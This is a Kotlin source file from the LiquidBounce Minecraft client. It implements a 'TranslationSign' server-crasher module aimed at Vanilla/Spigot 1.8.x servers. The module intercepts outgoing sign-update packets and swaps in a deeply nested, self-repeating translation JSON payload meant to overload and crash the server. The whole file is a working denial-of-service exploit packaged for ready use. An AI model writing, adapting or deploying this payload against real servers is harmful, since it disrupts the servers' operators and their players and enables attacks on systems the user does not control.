/*
 * This file is part of LiquidBounce (https://github.com/CCBlueX/LiquidBounce)
 *
 * Copyright (c) 2015 - 2024 CCBlueX
 *
 * LiquidBounce is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * LiquidBounce is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with LiquidBounce. If not, see <https://www.gnu.org/licenses/>.
 *
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import net.ccbluex.liquidbounce.config.Choice
import net.ccbluex.liquidbounce.config.ChoiceConfigurable
import net.ccbluex.liquidbounce.event.events.PacketEvent
import net.ccbluex.liquidbounce.event.handler
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.ModuleServerCrasher
import net.ccbluex.liquidbounce.utils.client.sendPacketSilently
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket

/**
 * Translation sign exploit
 * Works on Vanilla/Spigot 1.8.x
 *
 * Originally found by https://github.com/Outfluencer and then found by me (cuddlycatgirl) and some others.
 */
object TranslationSignExploit : Choice("TranslationSign") {

    override val parent: ChoiceConfigurable<Choice>
        get() = ModuleServerCrasher.exploitChoices

    private const val TEXT = "{\"translate\":\"%2\$s%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2\$s%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2\$s%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2\$s%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2\$s%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2\$s%2\$s%2\$s%2\$s\"," +
        "\"with\":[\"a\", \"a\"]}]}]}]}]}]}]}]}"

    @Suppress("unused")
    private val packetHandler = handler<PacketEvent> { event ->
        val original = event.packet

        if (original is UpdateSignC2SPacket) {
            val packet = UpdateSignC2SPacket(original.pos, original.isFront, TEXT, "", "", "")

            // Keeps from repeating
            sendPacketSilently(packet)
            event.cancelEvent()
        }
    }

}
